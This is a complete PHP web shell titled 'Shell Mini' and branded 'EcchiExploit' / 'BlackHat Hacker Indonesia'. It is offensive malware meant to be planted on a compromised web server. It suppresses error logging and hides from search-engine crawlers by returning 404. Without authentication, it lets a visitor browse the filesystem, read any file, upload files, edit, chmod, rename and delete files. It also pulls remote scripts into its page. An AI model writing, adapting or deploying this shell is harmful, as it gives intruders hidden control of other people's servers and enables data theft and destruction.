<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
session_start();
error_reporting(0);
set_time_limit(0);
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
       <html>
       <head>
           <title>Shell Mini</title>
           <link href="" rel="stylesheet" type="text/css">
           <style>
           input[type=text]{
    background: 0;
    color: #fff;
    margin: 3px;
    padding: 3px;
    border:1px solid dodgerblue;
    font-family: ;
}
input[type=submit]{
    width: 50px;
    height: 20px;
    background: dodgerblue;
    color: #fff;
    margin: 3px;
    padding: 3px;
    border: 0;
    font-family: ;
}
               body {
                   font-family: "tahoma", cursive;
                   background-color: black;
                   color:#26D4B5;
               }
               #content tr:hover{
                   text-shadow:0px 0px 10px;
               }
               #content .first{
               background-color: #1F0ECA;
               }
               table{
                   border: 1px #000000 dotted;
               }
               a{
                   color:#0B6890;
                   text-decoration: none;
               }
               a:hover{
                   color:#296BAF;
                   text-shadow:0px 0px 10px transparent;
               }
               input,select,textarea{
                   border: 1px #51A694 solid;
                   -moz-border-radius: 5px;
                   -webkit-border-radius:5px;
                   border-radius:5px;
               }
           </style>
       </head>
       <body>
           <h1>
               <center>
                   <font color="#D41313">./EcchiExploit</font>
               </center>
               <iframe width="0" height="0" src="https://d.top4top.io/m_1522nudw90.mp3" frameborder="0" loop="true" allow fullscreen></iframe>
               <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/green-bintang-jatuh.js" type="text/javascript"></script>
           </h1>
           <hr color=aqua>';
echo "<pre><center>System: <font color=lime>".php_uname()."</font><br>";
echo "Server IP: <font color=lime>$ip</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "<hr color=aqua></pre>";
            echo '</hr><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
               <tr>
                   <td>
                       <font color="aqua">Current Dir :</font> ';
 
if(isset($_GET['path'])){
    $path = $_GET['path'];
} else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
} echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">Upload Succeeded</font><br />';
    } else{
        echo '<font color="red">Upload Failed</font><br/>';
    }
} echo '<form enctype="multipart/form-data" method="POST">
       <font color="aqua">File Upload :</font> <input type="file" name="file" />
       <input type="submit" value="upload" />
       </form>
       </td>
       </tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Successful</font><br/>';
            } else{
                echo '<font color="red">Change Permission Failed</font><br />';
            }
        } echo '<form method="POST">
               Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
               <input type="hidden" name="path" value="'.$_POST['path'].'">
               <input type="hidden" name="opt" value="chmod">
               <input type="submit" value="Go" />
               </form>';
            } elseif($_POST['opt'] == 'rename'){
                if(isset($_POST['newname'])){
                    if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                        echo '<font color="green">Rename Successfully</font><br/>';
                    } else{
                        echo '<font color="red">Rename Failed</font><br />';
                    }
                    $_POST['name'] = $_POST['newname'];
                } echo '<form method="POST">
                       New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
                       <input type="hidden" name="path" value="'.$_POST['path'].'">
                       <input type="hidden" name="opt" value="rename">
                       <input type="submit" value="Go" />
                       </form>';
                    } elseif($_POST['opt'] == 'edit'){
                        if(isset($_POST['src'])){
                            $fp = fopen($_POST['path'],'w');
                            if(fwrite($fp,$_POST['src'])){
                                echo '<font color="green">Successfully Edit File</font><br/>';
                            } else{
                                echo '<font color="red">Failed to Edit File</font><br/>';
                            } fclose($fp);
                        } echo '<form method="POST">
                               <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
                               <input type="hidden" name="path" value="'.$_POST['path'].'">
                               <input type="hidden" name="opt" value="edit">
                               <input type="submit" value="Save" />
                               </form>';
                            } echo '</center>';
                        } else{
                            echo '</table><br/><center>';
                            if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
                                if($_POST['type'] == 'dir'){
                                    if(rmdir($_POST['path'])){
                                        echo '<font color="green">Deleted Directory</font><br/>';
                                    } else{
                                        echo '<font color="red">Directory Failed Deleted</font><br/>';
                                    }
                                } elseif($_POST['type'] == 'file'){
                                    if(unlink($_POST['path'])){
                                        echo '<font color="green">Deleted Files</font><br/>';
                                    } else{
                                        echo '<font color="red">File Failed Deleted</font><br/>';
                                    }
                                }
                            } echo '</center>';
                            $scandir = scandir($path);
                            echo '<div id="content">
                                 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
                                   <tr class="first">
                                       <td>
                                           <center>Name</peller></center>
                                       </td>
                                       <td>
                                           <center>Size</peller></center>
                                       </td>
                                       <td>
                                           <center>Permission</peller></center>
                                       </td>
                                       <td>
                                           <center>Modify</peller></center>
                                       </td>
                                   </tr>';
 
foreach($scandir as $dir){
    if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
    echo '<tr>
         <td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
         <td><center>--</center></td>
         <td><center>';
          if(is_writable($path.'/'.$dir)) echo '<font color="green">';
          elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
          echo perms($path.'/'.$dir);
          if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
          echo '</center></td>
               <td><center><form method="POST" action="?option&path='.$path.'">
                   <select name="opt">
                       <option value="">Select</option>
                       <option value="delete">Delete</option>
                       <option value="chmod">Chmod</option>
                       <option value="rename">Rename</option>
                   </select>
                   <input type="hidden" name="type" value="dir">
                   <input type="hidden" name="name" value="'.$dir.'">
                   <input type="hidden" name="path" value="'.$path.'/'.$dir.'">
                   <input type="submit" value=">">
                   </form></center></td>
                   </tr>';
                } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 
foreach($scandir as $file){
    if(!is_file($path.'/'.$file)) continue;
    $size = filesize($path.'/'.$file)/1024;
    $size = round($size,3);
    if($size >= 1024){
        $size = round($size/1024,2).' MB';
    } else{
        $size = $size.' KB';
    } echo '<tr>
           <td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
           <td><center>'.$size.'</center></td>
           <td><center>';
 
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
     <td><center><form method="POST" action="?option&path='.$path.'">
     <select name="opt">
       <option value="">Select</option>
       <option value="delete">Delete</option>
       <option value="chmod">Chmod</option>
       <option value="rename">Rename</option>
       <option value="edit">Edit</option>
     </select>
     <input type="hidden" name="type" value="file">
     <input type="hidden" name="name" value="'.$file.'">
     <input type="hidden" name="path" value="'.$path.'/'.$file.'">
     <input type="submit" value=">">
     </form></center></td>
     </tr>';
    } echo '</table></div>';
}
echo "<center><font size=4>[ <a href='?'>Home</a> ]</center></font>";
echo "<br><br><font size=6><i><u><a href='https://ecchiexploit.blogspot.com'>BlackHat Hacker Indonesia</i></u>";
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
        $info = 'p';
    } else {
    // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x' ) :
        (($perms & 0x0800) ? 'S' : '-'));
        // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x' ) :
        (($perms & 0x0400) ? 'S' : '-'));
        // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x' ) :
        (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>